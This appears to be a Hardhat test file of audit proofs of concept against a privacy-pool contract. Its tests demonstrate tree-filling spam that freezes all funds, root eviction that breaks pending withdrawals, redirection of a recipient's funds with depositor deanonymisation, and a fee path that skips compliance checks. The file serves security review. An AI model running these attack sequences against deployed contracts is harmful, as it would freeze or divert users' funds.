// Security review PoCs. Run: npx hardhat test test/audit_poc.test.js
const { expect } = require("chai");
const { ethers } = require("hardhat");
const src = require("../src");
const { Keypair, Utxo, buildTree, scanNotes, fetchAssociationSet, associationTree } = src;
const { deployVesper, approveAll } = require("./helpers");

const e = (n) => ethers.parseEther(String(n));

describe("AUDIT PoCs", function () {
  async function setup() {
    const ctx = await deployVesper();
    ctx.tslaAddr = await ctx.tsla.getAddress();
    ctx.aliceKp = new Keypair();
    ctx.bobKp = new Keypair();
    ctx.prep = async (opts) =>
      src.prepareTransaction({ pool: ctx.pool, asset: ctx.tslaAddr, chainId: ctx.chainId, tree: await buildTree(ctx.pool), ...opts });
    ctx.send = async (signer, opts) => {
      const p = await ctx.prep({ depositor: signer.address, ...opts });
      return ctx.pool.connect(signer).transact(p.args, p.extData, opts.asset ?? ctx.tslaAddr);
    };
    return ctx;
  }

  // Zero-value "transfer" with two dummy inputs and two zero outputs, any asset address.
  async function spam(ctx, signer, asset) {
    const p = await src.prepareTransaction({ pool: ctx.pool, asset, chainId: ctx.chainId, tree: await buildTree(ctx.pool) });
    const tx = await ctx.pool.connect(signer).transact(p.args, p.extData, asset);
    return (await tx.wait()).gasUsed;
  }

  it("F1: tokenless zero-value txs insert 2 leaves each (any asset, even unconfigured, deposits paused); a full tree freezes ALL funds incl. exits", async function () {
    const ctx = await setup();
    // Alice deposits 100 (approved).
    await ctx.send(ctx.alice, { outputs: [new Utxo({ amount: e(100), keypair: ctx.aliceKp, asset: ctx.tslaAddr })] });
    await approveAll(ctx);

    // Guardian pauses deposits: does not stop spam.
    await ctx.pool.setDepositsPaused(true);
    const attacker = ethers.Wallet.createRandom().connect(ethers.provider);
    await ctx.owner.sendTransaction({ to: attacker.address, value: e(1) });
    const junkAsset = ethers.Wallet.createRandom().address; // not a token, not configured
    const before = await ctx.pool.nextIndex();
    const gas = await spam(ctx, attacker, junkAsset);
    expect(await ctx.pool.nextIndex()).to.equal(before + 2n);
    console.log(`      gas per spam tx: ${gas}; leaves left: ${2n ** 20n - (before + 2n)}; total gas to fill ~${(gas * (2n ** 19n)) / 10n ** 9n} Ggas`);

    // Simulate the tree being full (slot 3 packs currentRootIndex (low 32 bits) | nextIndex (next 32 bits)).
    const addr = await ctx.pool.getAddress();
    const slot3 = BigInt(await ethers.provider.getStorage(addr, 3));
    expect((slot3 >> 32n) & 0xffffffffn).to.equal(await ctx.pool.nextIndex());
    const full = (slot3 & 0xffffffffn) | (2n ** 20n << 32n);
    await ethers.provider.send("hardhat_setStorageAt", [addr, "0x3", ethers.toBeHex(full, 32)]);
    expect(await ctx.pool.nextIndex()).to.equal(2n ** 20n);

    // Alice can no longer withdraw privately, nor exit to her own wallet: every tx must _insert.
    const [note] = await scanNotes(ctx.pool, ctx.aliceKp);
    const asp = await fetchAssociationSet(ctx.pool);
    const w = await ctx.prep({ inputs: [note], recipient: ctx.alice.address, asp });
    await expect(ctx.pool.connect(ctx.alice).transact(w.args, w.extData, ctx.tslaAddr)).to.be.revertedWith("tree is full");
    const x = await ctx.prep({ inputs: [note], recipient: ctx.alice.address, exit: true });
    await expect(ctx.pool.connect(ctx.alice).transact(x.args, x.extData, ctx.tslaAddr)).to.be.revertedWith("tree is full");
    expect(await ctx.tsla.balanceOf(addr)).to.equal(e(100)); // stuck forever (not upgradeable)
  });

  it("F2: 100 tokenless spam txs evict a user's root; their already-built withdrawal reverts UnknownRoot", async function () {
    this.timeout(1800000);
    const ctx = await setup();
    await ctx.send(ctx.alice, { outputs: [new Utxo({ amount: e(10), keypair: ctx.aliceKp, asset: ctx.tslaAddr })] });
    await approveAll(ctx);
    const [note] = await scanNotes(ctx.pool, ctx.aliceKp);
    const w = await ctx.prep({ inputs: [note], recipient: ctx.bob.address, asp: await fetchAssociationSet(ctx.pool) });
    const junk = ethers.Wallet.createRandom().address;
    let total = 0n;
    for (let i = 0; i < 100; i++) total += await spam(ctx, ctx.carol, junk);
    console.log(`      100 spam txs: ${total} gas`);
    await expect(ctx.pool.transact(w.args, w.extData, ctx.tslaAddr)).to.be.revertedWithCustomError(ctx.pool, "UnknownRoot");
  });

  it("F3: the postman can redirect a transferee's money to the original depositor; recipient learns depositor identity", async function () {
    const ctx = await setup();
    await ctx.send(ctx.alice, { outputs: [new Utxo({ amount: e(100), keypair: ctx.aliceKp, asset: ctx.tslaAddr })] });
    await approveAll(ctx);
    const [aNote] = await scanNotes(ctx.pool, ctx.aliceKp);
    // Alice pays Bob privately (e.g. for goods). Approved money.
    await ctx.send(ctx.alice, {
      inputs: [aNote],
      outputs: [new Utxo({ amount: e(100), keypair: Keypair.fromAddress(ctx.bobKp.address()), asset: ctx.tslaAddr })],
    });
    const [bobNote] = await scanNotes(ctx.pool, ctx.bobKp);

    // Privacy: Bob learns exactly which public wallet funded his payment, and how much it deposited.
    expect(await ctx.pool.depositorOf(bobNote.label)).to.equal(ctx.alice.address);
    const dep = (await src.fetchDeposits(ctx.pool)).find((d) => d.label === bobNote.label);
    expect(dep.amount).to.equal(e(100));

    // Postman publishes two sets without Alice's label (current + previous both exclude it).
    const other = associationTree([12345n]);
    await ctx.pool.updateAssociationSet(other.root(), [12345n], "revoke");
    await ctx.pool.updateAssociationSet(other.root(), [12345n], "revoke");
    // Bob can't withdraw to himself privately...
    const stale = { root: associationTree([bobNote.label]).root(), tree: associationTree([bobNote.label]), has: () => true };
    const w = await ctx.prep({ inputs: [bobNote], recipient: ctx.bob.address, asp: stale });
    await expect(ctx.pool.transact(w.args, w.extData, ctx.tslaAddr)).to.be.revertedWithCustomError(ctx.pool, "NotApproved");
    // ...nor exit to himself; the ONLY way out pays Alice.
    const toBob = await ctx.prep({ inputs: [bobNote], recipient: ctx.bob.address, exit: true });
    await expect(ctx.pool.transact(toBob.args, toBob.extData, ctx.tslaAddr)).to.be.revertedWithCustomError(ctx.pool, "BadExit");
    const aliceBefore = await ctx.tsla.balanceOf(ctx.alice.address);
    const toAlice = await ctx.prep({ inputs: [bobNote], recipient: ctx.alice.address, exit: true });
    await ctx.pool.transact(toAlice.args, toAlice.extData, ctx.tslaAddr);
    expect(await ctx.tsla.balanceOf(ctx.alice.address)).to.equal(aliceBefore + e(100));
  });

  it("F4: updateAssociationSet cost grows linearly with ALL approved labels (re-emitted every update)", async function () {
    const ctx = await setup();
    for (const n of [1000, 4000, 8000]) {
      const labels = Array.from({ length: n }, (_, i) => BigInt(i + 1));
      const tx = await ctx.pool.updateAssociationSet(1n + BigInt(n), labels, "x");
      const g = (await tx.wait()).gasUsed;
      console.log(`      ${n} labels: ${g} gas (${Number(g) / n} gas/label), calldata ${tx.data.length / 2} bytes`);
    }
  });

  it("F5: deposit with a relayer fee skips compliance entirely (fee paid by pool, no ASP check)", async function () {
    const ctx = await setup();
    const p = await ctx.prep({
      depositor: ctx.carol.address,
      outputs: [new Utxo({ amount: e(1), keypair: ctx.bobKp, asset: ctx.tslaAddr })],
      fee: e(9),
      relayer: ctx.relayer.address,
    });
    expect(p.args.aspRoot).to.equal(0n);
    await ctx.pool.connect(ctx.carol).transact(p.args, p.extData, ctx.tslaAddr);
    expect(await ctx.tsla.balanceOf(ctx.relayer.address)).to.equal(e(9));
  });
});
